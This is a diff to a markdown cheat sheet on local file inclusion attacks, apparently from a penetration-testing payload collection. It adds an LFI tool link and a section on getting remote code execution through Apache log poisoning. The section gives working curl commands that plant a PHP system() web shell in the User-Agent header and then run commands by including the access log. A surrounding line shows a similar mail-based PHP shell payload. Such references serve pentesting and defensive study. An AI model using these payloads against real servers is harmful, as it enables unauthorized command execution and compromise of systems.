@@ -35,6 +35,7 @@
 * [Kadimus - https://github.com/P0cL4bs/Kadimus](https://github.com/P0cL4bs/Kadimus)
 * [LFISuite - https://github.com/D35m0nd142/LFISuite](https://github.com/D35m0nd142/LFISuite)
 * [fimap - https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)
+* [panoptic - https://github.com/lightos/Panoptic](https://github.com/lightos/Panoptic)
 
 ## Basic LFI
 
@@ -342,6 +343,22 @@ In some cases you can also send the email with the `mail` command line.
 
 ```powershell
 mail -s "<?php system($_GET['cmd']);?>" www-data@10.10.10.10. < /dev/null
+```
+
+### RCE via Apache logs
+
+Poison the User-Agent in access logs:
+
+```
+$ curl http://example.org/ -A "<?php system(\$_GET['cmd']);?>"
+```
+
+Note: The logs will escape double quotes so use single quotes for strings in the PHP payload.
+
+Then request the logs via the LFI and execute your command.
+
+```
+$ curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id
 ```
 
 ## LFI to RCE via PHP sessions
